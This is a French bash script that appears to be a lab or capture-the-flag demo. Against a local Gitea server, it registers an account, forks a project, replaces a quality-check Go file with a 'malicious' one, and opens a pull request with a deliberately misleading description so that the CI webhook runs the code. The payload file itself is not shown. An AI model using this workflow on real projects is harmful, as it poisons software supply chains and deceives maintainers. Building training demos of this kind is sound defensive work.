#!/usr/bin/env bash

###############################################################################
# demo-contribution.sh
#
# Simule une contribution open source malveillante (supply chain attack demo)
# Utilise demo-magic pour un affichage interactif "type-along"
#
# Usage: ./demo-challenge_1.sh
###############################################################################

set -uo pipefail

#=============================================================================
# INSTALLATION AUTOMATIQUE DE DEMO-MAGIC
#=============================================================================
DEMO_MAGIC_DIR="${HOME}/demo-magic"
DEMO_MAGIC_SCRIPT="${DEMO_MAGIC_DIR}/demo-magic.sh"
SCRIPT_DIR="$(pwd)"

install_demo_magic() {
    echo "╔════════════════════════════════════════════════════════════════════╗"
    echo "║  📦 Demo-magic n'est pas installé. Installation en cours...        ║"
    echo "╚════════════════════════════════════════════════════════════════════╝"
    echo ""

    if ! command -v git &> /dev/null; then
        echo "❌ Erreur: git n'est pas installé. Veuillez l'installer d'abord."
        exit 1
    fi

    if [[ -d "${DEMO_MAGIC_DIR}" ]]; then
        echo "🧹 Nettoyage de l'installation précédente..."
        rm -rf "${DEMO_MAGIC_DIR}"
    fi

    echo "📥 Clonage de demo-magic depuis GitHub..."
    if git clone --depth 1 https://github.com/paxtonhare/demo-magic.git "${DEMO_MAGIC_DIR}" 2>/dev/null; then
        echo "✅ Demo-magic installé avec succès dans ${DEMO_MAGIC_DIR}"
    else
        echo "❌ Erreur lors du clonage de demo-magic"
        echo "   Tentative de téléchargement direct..."

        mkdir -p "${DEMO_MAGIC_DIR}"
        if command -v curl &> /dev/null; then
            curl -fsSL "https://raw.githubusercontent.com/paxtonhare/demo-magic/master/demo-magic.sh" \
                -o "${DEMO_MAGIC_SCRIPT}"
        elif command -v wget &> /dev/null; then
            wget -q "https://raw.githubusercontent.com/paxtonhare/demo-magic/master/demo-magic.sh" \
                -O "${DEMO_MAGIC_SCRIPT}"
        else
            echo "❌ Erreur: ni curl ni wget n'est disponible"
            exit 1
        fi
        echo "✅ Demo-magic téléchargé avec succès"
    fi

    if [[ ! -f "${DEMO_MAGIC_SCRIPT}" ]]; then
        echo "❌ Erreur: Le fichier demo-magic.sh n'a pas été trouvé après installation"
        exit 1
    fi

    chmod +x "${DEMO_MAGIC_SCRIPT}"
    echo ""
    echo "🚀 Lancement de la démo..."
    echo ""
    sleep 2
}

if [[ ! -f "${DEMO_MAGIC_SCRIPT}" ]]; then
    install_demo_magic
fi

#=============================================================================
# VÉRIFICATION DES DÉPENDANCES
#=============================================================================
check_dependencies() {
    local missing_deps=()

    for cmd in git curl jq; do
        if ! command -v "$cmd" &> /dev/null; then
            missing_deps+=("$cmd")
        fi
    done

    if [[ ${#missing_deps[@]} -gt 0 ]]; then
        echo "❌ Erreur: Les dépendances suivantes sont manquantes:"
        printf '   - %s\n' "${missing_deps[@]}"
        echo ""
        echo "Installez-les avec:"
        echo "   sudo apt-get install ${missing_deps[*]}   # Debian/Ubuntu"
        echo "   sudo yum install ${missing_deps[*]}       # RHEL/CentOS"
        echo "   brew install ${missing_deps[*]}           # macOS"
        exit 1
    fi
}

check_dependencies

#=============================================================================
# CONFIGURATION DEMO-MAGIC
#=============================================================================
# shellcheck source=/dev/null
. "${DEMO_MAGIC_SCRIPT}" -n

TYPE_SPEED=40
DEMO_PROMPT="${GREEN}➜ ${CYAN}\W ${COLOR_RESET}"
DEMO_CMD_COLOR=$WHITE

#=============================================================================
# VARIABLES DE CONFIGURATION
#=============================================================================
GITEA_URL="http://gitea.sc.local:30080/"
GITEA_USER="hacker_challenge1"
GITEA_PASS="Test1234"
GITEA_EMAIL="${GITEA_USER}@example.com"
UPSTREAM_OWNER="sc-admin"
UPSTREAM_REPO="recipe-api"
MALICIOUS_SRC="${SCRIPT_DIR}/malicious-gitea-issue.go"
TARGET_PATH="scripts/quality-check/main.go"
BRANCH_NAME="fix/improve-quality-check"
COMMIT_MSG="fix: improve quality check script performance"
PR_TITLE="Fix: Improve quality check script performance"
PR_BODY="This PR improves the quality check script by optimizing the main loop and reducing unnecessary allocations.\n\nChanges:\n- Refactored main.go for better performance\n- Reduced memory footprint\n\nTested locally, all checks pass."
WORK_DIR="/tmp/demo-contribution"

#=============================================================================
# VÉRIFICATIONS PRÉ-DÉMO
#=============================================================================
verify_prerequisites() {
    local errors=0

    echo "🔍 Vérification des prérequis..."
    echo ""

    if [[ ! -f "${MALICIOUS_SRC}" ]]; then
        echo "❌ Fichier source malveillant non trouvé: ${MALICIOUS_SRC}"
        ((errors++)) || true
    else
        echo "✅ Fichier source malveillant trouvé"
    fi

    if ! curl -s --connect-timeout 5 "${GITEA_URL}/api/v1/version" &> /dev/null; then
        echo "❌ Gitea n'est pas accessible sur ${GITEA_URL}"
        ((errors++)) || true
    else
        echo "✅ Gitea est accessible"
    fi

    if ! curl -s --connect-timeout 5 \
        "${GITEA_URL}/api/v1/repos/${UPSTREAM_OWNER}/${UPSTREAM_REPO}" &> /dev/null; then
        echo "❌ Repository ${UPSTREAM_OWNER}/${UPSTREAM_REPO} non trouvé"
        ((errors++)) || true
    else
        echo "✅ Repository upstream trouvé"
    fi

    echo ""

    if [[ $errors -gt 0 ]]; then
        echo "❌ ${errors} erreur(s) détectée(s). Corrigez-les avant de continuer."
        exit 1
    fi

    echo "✅ Tous les prérequis sont satisfaits!"
    echo ""
    sleep 2
}

verify_prerequisites

#=============================================================================
# NETTOYAGE INITIAL (silencieux, avant la démo)
#=============================================================================
echo "🧹 Nettoyage des ressources précédentes..."

# Supprimer le répertoire de travail
rm -rf "${WORK_DIR}"
mkdir -p "${WORK_DIR}"

# Supprimer le fork existant si présent (ignore les erreurs)
curl -s -X DELETE \
    -u "${GITEA_USER}:${GITEA_PASS}" \
    "${GITEA_URL}/api/v1/repos/${GITEA_USER}/${UPSTREAM_REPO}" \
    > /dev/null 2>&1 || true

# Supprimer le compte existant si présent
# (nécessite les credentials admin — adapter si nécessaire)
ADMIN_USER="ctf-admin"
ADMIN_PASS="Test1234!"
curl -s -X DELETE \
    -u "${ADMIN_USER}:${ADMIN_PASS}" \
    "${GITEA_URL}/api/v1/admin/users/${GITEA_USER}" \
    > /dev/null 2>&1 || true

# Nettoyer les fichiers temporaires
rm -f /tmp/gitea_cookies.txt /tmp/csrf_token.txt

echo "✅ Nettoyage terminé"
sleep 1

clear

#=============================================================================
# ÉTAPE 0 : INTRODUCTION
#=============================================================================
p "# ======================================================================"
p "# 🎭 DEMO : Contribution Open Source (Supply Chain Attack Simulation)"
p "# ======================================================================"
p ""
wait

p "# 📋 Plan d'attaque :"
p "#   1. Créer un compte sur Gitea (inscription publique)"
p "#   2. Forker le projet cible"
p "#   3. Cloner le fork"
p "#   4. Créer une branche"
p "#   5. Remplacer un fichier par du code malveillant"
p "#   6. Add, Commit, Push"
p "#   7. Créer une Pull Request"
p ""
wait

#=============================================================================
# ÉTAPE 1 : CRÉATION DU COMPTE UTILISATEUR (INSCRIPTION PUBLIQUE)
#=============================================================================
p "# ======================================================================"
p "# 🔑 ÉTAPE 1 : Création d'un compte sur Gitea (inscription publique)"
p "# ======================================================================"
p ""
wait

p "# Comme sur GitHub, n'importe qui peut créer un compte..."
p "# Étape 1/2 : Récupération du token CSRF depuis la page d'inscription"

# Exécution réelle silencieuse (récupère et stocke le CSRF)
curl -s -c /tmp/gitea_cookies.txt "${GITEA_URL}/user/sign_up" \
    | grep -oP '(?<=name="_csrf" value=")[^"]+' \
    > /tmp/csrf_token.txt 2>/dev/null || true

# Affichage demo-magic (rejoue la commande visuellement)
pe "curl -s -c /tmp/gitea_cookies.txt '${GITEA_URL}/user/sign_up' \
  | grep -oP 'name=\"_csrf\" value=\"\K[^\"]+' \
  | tee /tmp/csrf_token.txt"

wait

p ""
p "# Étape 2/2 : Soumission du formulaire d'inscription avec le token CSRF"
pe "curl -s -o /dev/null -w 'HTTP Status: %{http_code}\n' \
  -b /tmp/gitea_cookies.txt \
  -c /tmp/gitea_cookies.txt \
  -X POST '${GITEA_URL}/user/sign_up' \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  --data-urlencode \"_csrf=\$(cat /tmp/csrf_token.txt)\" \
  --data-urlencode 'user_name=${GITEA_USER}' \
  --data-urlencode 'email=${GITEA_EMAIL}' \
  --data-urlencode 'password=${GITEA_PASS}' \
  --data-urlencode 'retype=${GITEA_PASS}'"

wait

p ""
p "# ✅ Vérifions que le compte existe en s'authentifiant via l'API..."

# Petite pause pour que Gitea enregistre le compte
sleep 1

pe "curl -s -u '${GITEA_USER}:${GITEA_PASS}' \
  '${GITEA_URL}/api/v1/user' \
  | jq '{login: .login, id: .id, email: .email}'"

wait

#=============================================================================
# ÉTAPE 2 : FORK DU PROJET
#=============================================================================
p ""
p "# ======================================================================"
p "# 🍴 ÉTAPE 2 : Fork du projet ${UPSTREAM_OWNER}/${UPSTREAM_REPO}"
p "# ======================================================================"
p ""
wait

p "# Le projet original est public : ${GITEA_URL}/${UPSTREAM_OWNER}/${UPSTREAM_REPO}"
p "# N'importe quel utilisateur connecté peut le forker..."

pe "curl -s -X POST '${GITEA_URL}/api/v1/repos/${UPSTREAM_OWNER}/${UPSTREAM_REPO}/forks' \
  -H 'Content-Type: application/json' \
  -u '${GITEA_USER}:${GITEA_PASS}' \
  -d '{}' | jq '{full_name: .full_name, clone_url: .clone_url, fork: .fork, parent: .parent.full_name}'"

wait

p ""
p "# ✅ Fork créé avec succès !"

# Pause pour que Gitea finalise la création du fork
sleep 3

wait

#=============================================================================
# ÉTAPE 3 : CLONE DU FORK
#=============================================================================
p ""
p "# ======================================================================"
p "# 📥 ÉTAPE 3 : Clone du fork en local"
p "# ======================================================================"
p ""
wait

pe "cd ${WORK_DIR}"

p "# Clone du fork..."
pe "git clone http://${GITEA_USER}:${GITEA_PASS}@gitea.sc.local:30080/${GITEA_USER}/${UPSTREAM_REPO}.git"

wait

pe "cd ${UPSTREAM_REPO}"

p ""
p "# Structure actuelle du projet :"
pe "find . -type f -not -path './.git/*' | head -20"

wait

p ""
p "# Contenu actuel du fichier cible :"
pe "cat ${TARGET_PATH}"

wait

#=============================================================================
# ÉTAPE 4 : CRÉATION DE LA BRANCHE
#=============================================================================
p ""
p "# ======================================================================"
p "# 🌿 ÉTAPE 4 : Création d'une branche de travail"
p "# ======================================================================"
p ""
wait

pe "git checkout -b '${BRANCH_NAME}'"

p ""
pe "git branch -a"

wait

#=============================================================================
# ÉTAPE 5 : REMPLACEMENT DU FICHIER (INJECTION DU CODE MALVEILLANT)
#=============================================================================
p ""
p "# ======================================================================"
p "# 💀 ÉTAPE 5 : Remplacement du fichier par le code 'amélioré'"
p "# ======================================================================"
p ""
wait

p "# Le fichier source (soi-disant 'amélioré') :"
pe "wc -l ${MALICIOUS_SRC}"

p ""
p "# Aperçu du contenu (premières lignes) :"
pe "head -30 ${MALICIOUS_SRC}"

wait

p ""
p "# Copie du fichier malveillant par-dessus l'original..."
pe "cp ${MALICIOUS_SRC} ./${TARGET_PATH}"

p ""
p "# ✅ Fichier remplacé ! Vérifions :"
pe "head -30 ./${TARGET_PATH}"

wait

p ""
p "# Différences avec l'original :"
pe "git diff --stat"

wait

pe "git diff ${TARGET_PATH} | head -60"

wait

#=============================================================================
# ÉTAPE 6 : ADD, COMMIT, PUSH
#=============================================================================
p ""
p "# ======================================================================"
p "# 📤 ÉTAPE 6 : Git Add, Commit et Push"
p "# ======================================================================"
p ""
wait

p "# Configuration de l'identité git..."
pe "git config user.name '${GITEA_USER}'"
pe "git config user.email '${GITEA_EMAIL}'"

wait

p ""
p "# Staging du fichier modifié..."
pe "git add ${TARGET_PATH}"

p ""
pe "git status"

wait

p ""
p "# Commit avec un message qui a l'air légitime..."
pe "git commit -m '${COMMIT_MSG}'"

wait

p ""
p "# Push de la branche vers le fork..."
pe "git push --set-upstream origin '${BRANCH_NAME}'"

wait

p ""
p "# ✅ Code poussé sur le fork !"
wait

#=============================================================================
# ÉTAPE 7 : CRÉATION DE LA PULL REQUEST
#=============================================================================
p ""
p "# ======================================================================"
p "# 📬 ÉTAPE 7 : Création de la Pull Request vers le projet original"
p "# ======================================================================"
p ""
wait

p "# Création de la PR via l'API Gitea..."
p "# Cela déclenchera le webhook configuré sur le repo upstream..."

pe "curl -s -X POST '${GITEA_URL}/api/v1/repos/${UPSTREAM_OWNER}/${UPSTREAM_REPO}/pulls' \
  -H 'Content-Type: application/json' \
  -u '${GITEA_USER}:${GITEA_PASS}' \
  -d '{
    \"title\": \"${PR_TITLE}\",
    \"body\": \"${PR_BODY}\",
    \"head\": \"${GITEA_USER}:${BRANCH_NAME}\",
    \"base\": \"main\"
  }' | jq '{
    number: .number,
    title: .title,
    state: .state,
    user: .user.login,
    head: .head.label,
    base: .base.label,
    html_url: .html_url,
    mergeable: .mergeable
  }'"

wait

#=============================================================================
# ÉTAPE 8 : VÉRIFICATION
#=============================================================================
p ""
p "# ======================================================================"
p "# 🔍 ÉTAPE 8 : Vérification - La PR est visible sur le projet upstream"
p "# ======================================================================"
p ""
wait

p "# Liste des Pull Requests ouvertes sur le projet original :"
pe "curl -s -u '${GITEA_USER}:${GITEA_PASS}' \
  '${GITEA_URL}/api/v1/repos/${UPSTREAM_OWNER}/${UPSTREAM_REPO}/pulls?state=open' \
  | jq '.[] | {number: .number, title: .title, user: .user.login, state: .state, created_at: .created_at}'"

wait

p ""
p "# 🔗 Accès direct à la PR :"
p "#    ${GITEA_URL}/${UPSTREAM_OWNER}/${UPSTREAM_REPO}/pulls"
p ""

#=============================================================================
# RÉSUMÉ
#=============================================================================
p "# ======================================================================"
p "# 📊 RÉSUMÉ DE L'ATTAQUE"
p "# ======================================================================"
p "#"
p "# ✅ Compte créé (inscription publique) : ${GITEA_USER}"
p "# ✅ Fork créé                          : ${GITEA_USER}/${UPSTREAM_REPO}"
p "# ✅ Branche                            : ${BRANCH_NAME}"
p "# ✅ Fichier remplacé                   : ${TARGET_PATH}"
p "# ✅ Code malveillant src               : ${MALICIOUS_SRC}"
p "# ✅ PR créée                           : ${PR_TITLE}"
p "# ✅ Webhook déclenché                  : sur le repo upstream"
p "#"
p "# ⚠️  AUCUN ACCÈS PRIVILÉGIÉ REQUIS !"
p "#    - Inscription publique (comme GitHub)"
p "#    - Fork d'un projet public"
p "#    - PR vers le projet original"
p "#    → Le webhook CI s'exécute avec le code malveillant"
p "#"
p "# ======================================================================"
p ""

wait

p "# 🎬 Fin de la démo !"